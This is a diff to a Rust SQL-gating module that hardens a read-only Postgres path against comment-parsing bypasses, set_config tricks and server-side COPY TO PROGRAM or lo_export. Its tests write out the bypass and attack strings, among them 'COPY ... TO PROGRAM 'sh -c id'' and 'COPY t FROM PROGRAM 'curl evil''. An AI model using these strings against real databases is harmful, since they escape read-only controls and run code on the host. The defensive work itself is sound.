@@ -40,9 +40,12 @@ impl TxStatus {
 /// begins: `$1` and a bare `$` fall through as ordinary bytes.
 fn skip_noise(b: &[u8], i: usize) -> Option<(usize, bool)> {
     match b[i] {
+        // Postgres and psql end a `--` comment at CR as well as LF (their
+        // lexers spell the body `[^\n\r]`). Stopping only at LF would hide
+        // `-- x\rCOMMIT` from every gate built on this scanner.
         b'-' if b.get(i + 1) == Some(&b'-') => {
             let mut i = i;
-            while i < b.len() && b[i] != b'\n' {
+            while i < b.len() && b[i] != b'\n' && b[i] != b'\r' {
                 i += 1;
             }
             Some((i, false))
@@ -195,18 +198,27 @@ pub fn split_statements(sql: &str) -> Vec<String> {
 
 /// Skips leading whitespace and SQL comments so keyword sniffing sees the
 /// actual command (`-- note\nBEGIN` -> `BEGIN`).
-fn strip_leading_noise(mut s: &str) -> &str {
+///
+/// Comment boundaries come from [`skip_noise`] rather than a second, simpler
+/// matcher here. The two used to disagree — this one closed `/* … */` at the
+/// first `*/` (Postgres nests them) and ended `--` only at LF — and every
+/// disagreement is a statement the gates read as a comment while the server
+/// reads it as code: `/* a /* b */ x */ COMMIT` sniffed as `x`, not `COMMIT`.
+fn strip_leading_noise(s: &str) -> &str {
+    let b = s.as_bytes();
+    let mut i = 0;
     loop {
-        s = s.trim_start();
-        if let Some(rest) = s.strip_prefix("--") {
-            s = rest.split_once('\n').map_or("", |(_, r)| r);
-        } else if s.starts_with("/*") {
-            match s.find("*/") {
-                Some(i) => s = &s[i + 2..],
-                None => return "",
-            }
-        } else {
-            return s;
+        while i < b.len() && b[i].is_ascii_whitespace() {
+            i += 1;
+        }
+        if i >= b.len() {
+            return "";
+        }
+        // Only comments are skippable noise: a leading string literal or quoted
+        // identifier is already the statement's content.
+        match skip_noise(b, i) {
+            Some((next, false)) if next > i => i = next,
+            _ => return &s[i..],
         }
     }
 }
@@ -289,6 +301,17 @@ pub fn is_tx_control_only(sql: &str) -> bool {
         })
 }
 
+/// True when the batch ends a transaction by *committing* it (`COMMIT`/`END`)
+/// rather than discarding it. Only meaningful together with
+/// [`is_tx_control_only`]: a read-only caller may always throw pending work
+/// away, but making someone else's pending writes permanent is itself a write,
+/// and on a production profile it belongs behind the same barrier.
+pub fn commits_tx(sql: &str) -> bool {
+    split_statements(sql)
+        .iter()
+        .any(|s| matches!(head_keywords(s).0.as_str(), "COMMIT" | "END"))
+}
+
 /// True when the batch can leave the transaction block it runs in, i.e. escape
 /// an explicit `BEGIN READ ONLY` (see [`execute_read_only`](super::execute_read_only)).
 ///
@@ -311,6 +334,14 @@ pub fn is_tx_control_only(sql: &str) -> bool {
 pub fn escapes_read_only_tx(sql: &str) -> bool {
     split_statements(sql).iter().any(|stmt| {
         let (w0, w1) = head_keywords(stmt);
+        // `set_config('default_transaction_read_only','off',false)` is `SET` in
+        // function form, and a function call reaches the GUC from under any
+        // head keyword — SELECT, a CTE, a DO body. Checking it outside the
+        // SET/RESET arm below is what keeps "the read-only path never touches
+        // the read-only knobs" true rather than true-for-one-spelling.
+        if calls_set_config(stmt) && mentions_read_only_guc(stmt) {
+            return true;
+        }
         match w0.as_str() {
             "COMMIT" | "END" | "ABORT" => !chains_new_tx(stmt),
             // ROLLBACK TO [SAVEPOINT] stays inside the block; plain ROLLBACK ends it
@@ -357,6 +388,40 @@ fn mentions_read_only_guc(stmt: &str) -> bool {
     words_of(stmt)
         .iter()
         .any(|w| w == "TRANSACTION_READ_ONLY" || w == "DEFAULT_TRANSACTION_READ_ONLY")
+}
+
+/// True when the statement calls `set_config(…)` (bare or `pg_catalog.`-quali-
+/// fied). Only the setter is matched: `current_setting('transaction_read_only')`
+/// reads the knob and must keep working on the read-only path.
+fn calls_set_config(stmt: &str) -> bool {
+    words_of(stmt).iter().any(|w| w == "SET_CONFIG")
+}
+
+/// True when the batch reaches the database server's filesystem or shell.
+/// A read-only transaction does not stop any of this: Postgres refuses `COPY
+/// FROM` there, but `COPY (SELECT 1) TO PROGRAM 'sh -c …'` still spawns a
+/// process and `COPY … TO '/path'` still writes a file — neither is a database
+/// write, so `XactReadOnly` never sees them. That matters most on the `exec`
+/// path, where psql runs as the container's `POSTGRES_USER` (usually a
+/// superuser), so this gate is what stands between a read-only call and
+/// arbitrary code on the database host.
+///
+/// `COPY … TO STDOUT` / `FROM STDIN` stream through the client and stay allowed.
+pub fn reaches_server_side_io(sql: &str) -> bool {
+    split_statements(sql).iter().any(|stmt| {
+        let words = words_of(stmt);
+        // Large objects export straight to a server path, under any head keyword.
+        if words.iter().any(|w| w == "LO_EXPORT" || w == "LO_IMPORT") {
+            return true;
+        }
+        if head_keywords(stmt).0 != "COPY" {
+            return false;
+        }
+        // PROGRAM is a shell; anything that is neither PROGRAM nor a std stream
+        // is a server-side path (`COPY t TO '/tmp/x'`).
+        words.iter().any(|w| w == "PROGRAM")
+            || !words.iter().any(|w| w == "STDOUT" || w == "STDIN")
+    })
 }
 
 /// True for `COMMIT/ROLLBACK/END/ABORT … AND CHAIN` (PG 12+): the statement
@@ -415,6 +480,57 @@ mod tests {
         assert!(!escapes_read_only_tx("SELECT 'COMMIT'"));
         assert!(!escapes_read_only_tx("DO $$ BEGIN PERFORM 1; END $$"));
         assert!(!escapes_read_only_tx(""));
+    }
+
+    #[test]
+    fn comment_tricks_do_not_hide_tx_control() {
+        // A lone CR ends a `--` comment for Postgres, so everything after it is
+        // code the gate has to see.
+        assert!(escapes_read_only_tx("-- x\rCOMMIT"));
+        assert!(escapes_read_only_tx("SELECT 1; -- x\rROLLBACK"));
+        assert_eq!(psql_meta_commands("-- x\r\\! id"), ["!"]);
+        // CRLF is still one line ending, and a real comment stays opaque
+        assert!(!escapes_read_only_tx("-- COMMIT\r\nSELECT 1"));
+        assert!(psql_meta_commands("-- \\c nope\r\nSELECT 1").is_empty());
+        // Block comments nest in Postgres: the statement below is one comment
+        // followed by COMMIT, not `x */ COMMIT`.
+        assert!(escapes_read_only_tx("/* a /* b */ x */ COMMIT"));
+        assert!(escapes_read_only_tx("/* /* */ */ SET TRANSACTION READ WRITE"));
+        assert!(!escapes_read_only_tx("/* a /* COMMIT */ b */ SELECT 1"));
+    }
+
+    #[test]
+    fn set_config_is_the_same_knob_as_set() {
+        // the functional spelling reaches the GUC from under any head keyword
+        assert!(escapes_read_only_tx(
+            "SELECT set_config('default_transaction_read_only', 'off', false)"
+        ));
+        assert!(escapes_read_only_tx(
+            "SELECT pg_catalog.set_config('transaction_read_only','off',false)"
+        ));
+        assert!(escapes_read_only_tx(
+            "DO $$ BEGIN PERFORM set_config('transaction_read_only','off',false); END $$"
+        ));
+        // reading the knob is harmless and must keep working
+        assert!(!escapes_read_only_tx("SELECT current_setting('transaction_read_only')"));
+        assert!(!escapes_read_only_tx("SELECT set_config('search_path', 'app', false)"));
+    }
+
+    #[test]
+    fn server_side_io_gate() {
+        use super::reaches_server_side_io;
+        // a shell on the database host — read-only transactions do not stop it
+        assert!(reaches_server_side_io("COPY (SELECT 1) TO PROGRAM 'sh -c id'"));
+        assert!(reaches_server_side_io("COPY t FROM PROGRAM 'curl evil'"));
+        // writing a file on the server
+        assert!(reaches_server_side_io("COPY t TO '/tmp/dump.csv'"));
+        assert!(reaches_server_side_io("SELECT lo_export(16384, '/tmp/x')"));
+        // streaming through the client stays allowed
+        assert!(!reaches_server_side_io("COPY t TO STDOUT WITH CSV"));
+        assert!(!reaches_server_side_io("COPY t FROM STDIN"));
+        assert!(!reaches_server_side_io("SELECT 1"));
+        // the keyword inside text is text
+        assert!(!reaches_server_side_io("SELECT 'COPY t TO PROGRAM'"));
     }
 
     #[test]
